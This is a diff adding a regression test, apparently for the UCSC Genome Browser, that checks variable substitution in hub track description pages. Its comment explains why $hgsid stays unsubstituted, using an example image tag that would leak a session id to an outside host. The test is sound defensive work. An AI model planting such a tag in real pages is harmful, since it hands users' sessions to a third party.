@@ -1,0 +1,90 @@
+# #38283 -- a hub track's description page never went through variable substitution, so a
+# $db or $parentTrack in it reached the reader as literal text.  Native trackDb pages have
+# always been fine: hgTrackDb substitutes them when it loads trackDb.  A hub's html comes
+# straight off the hub's web server and there was no equivalent step.  Split out of #37599,
+# where the imprinting subtrack pages needed a link back to their container.
+#
+# c0e8fa6df3a does the substitution at RENDER time instead, in hgc and in hgTrackUi (they
+# call it separately), where $db, $hgsid and $parentTrack resolve to the hub_<id>_ names the
+# CGIs actually use, and adds $parentTrack, the container a track sits in.  5f590f874b9 then
+# split the recognized list in two and gave native pages a deferred ${hgsid} pass of their
+# own.
+#
+# Three things are asserted, and the second and third are the ones that are easy to break:
+#
+# 1. THE VARIABLES RESOLVE, in both CGIs.  $parentTrack has to name the COMPOSITE for a
+#    subtrack that sits under a VIEW -- a view has no description page of its own, so the
+#    walk skips it -- and the SUPERTRACK for a superTrack child.  The link is followed rather
+#    than only matched, so "it emits a working link to its container" is tested rather than
+#    asserted about a string.
+#
+# 2. AN UNKNOWN VARIABLE IS LEFT ALONE.  Only nine names are recognized, deliberately: a
+#    public hub can easily have "$track" inside a shell example in its Data Access section,
+#    and quietly rewriting that would be worse than not substituting at all.  The DECOYS line
+#    is one text: check covering $5, $HOME, ${notAVariable}, $type, $bigDataUrl and a bare
+#    dollar sign, all of which must come through the page unchanged.
+#
+# 3. $hgsid IS NOT SUBSTITUTED IN A HUB PAGE, and that is a security property rather than an
+#    oversight.  hVarSubst.c says why: a hub's page is written by someone else and only
+#    lightly sanitized (htmlSanitize allows an <img> with an http src), so a page holding
+#    <img src="https://example.com/px?s=${hgsid}"> would hand the reader's session id to the
+#    hub's server -- and a session id on its own is enough to read and write that cart.  So
+#    the check is that the literal "$hgsid" survives.  ${db} beside it, which DOES resolve,
+#    is what stops that being a check that substitution simply failed.
+#
+# The fixture is ~/public_html/docentFixtures/rm38283/: one description page shared by three
+# tracks, a composite, a view under it, a subtrack under the view, and a superTrack with one
+# child.  Every name carries the rm38283 prefix (regress/README.txt).  Note that the hub's
+# files are cached by udc on the server, so an edit to the fixture is not visible for some
+# minutes; a changed page is best given a new file name.
+#
+# NOT covered: the native half of 5f590f874b9, the deferred ${hgsid} pass over a NATIVE
+# trackDb description page.  Eighteen html files in the tree use it and all eighteen are in
+# makeDb/trackDb/contrib/bTaeGut7, which is a hub; no page on a database assembly does, so
+# there is nothing on genome-test to point a test at.
+#
+# There is no `hide: all` here on purpose.  It survives into the hub attach and leaves the
+# superTrack child hidden, and a hub track's cart name carries a per-run hub_<n>_ prefix that
+# `track:` cannot write, so there is no way to turn it back on.
+proof:
+  - "assertion-only 2026-09-17 -- written from #38283, c0e8fa6df3a and 5f590f874b9 after both reached genome-test"
+  - "release-ab 2026-09-17 -- fails on v503 and passes on genome-test (v504). v503_branch 707b184e329 built into ticket sandbox 38316, CGIs, js and htdocs: the hub description page emits no $parentTrack link to its container"
+
+target: genome-test
+db: hg38
+position: chr17:7667000-7676000
+reset: true
+fast: true
+steps:
+  - hub: {url: "https://hgwdev.gi.ucsc.edu/~braney/docentFixtures/rm38283/hub.txt", db: hg38}
+  - go: chr17:7667000-7676000
+  - expect: {rows: [rm38283Sub, rm38283SuperKid]}
+
+  # hgc, for the subtrack that sits under a view inside a composite.
+  - click: {track: rm38283Sub, item: itemA}
+  - expect:
+      # $parentTrack skipped the view and named the composite.  The href is matched at its
+      # END because the hub id in front of the name changes every run.
+      has: 'a[href$="_rm38283Comp"]'
+      noHas: 'a[href*="rm38283View"]'
+  - expect: {text: "DBIS hg38"}
+  - expect: {text: "BRACEDDB hg38"}
+  - expect: {text: "ORGANISMIS human"}
+  - expect: {text: "HGSIDIS $hgsid"}
+  - expect: {text: "DECOYS $5 $HOME ${notAVariable} $type $bigDataUrl and a bare $ sign"}
+
+  # Follow the link the substitution built.  hgTrackUi substitutes the same page through its
+  # own call, so this step covers the second CGI as well as proving the link works.
+  - click: 'a:has-text("go to the container")'
+  - expect:
+      url: hgTrackUi
+      text: "rm38283 composite container"
+  - expect: {text: "DECOYS $5 $HOME ${notAVariable} $type $bigDataUrl and a bare $ sign"}
+  - expect: {text: "HGSIDIS $hgsid"}
+
+  # And a superTrack child, where $parentTrack has a container of a different kind to name.
+  - go: chr17:7667000-7676000
+  - click: {track: rm38283SuperKid, item: itemB}
+  - expect:
+      has: 'a[href$="_rm38283Super"]'
+      text: "DBIS hg38"
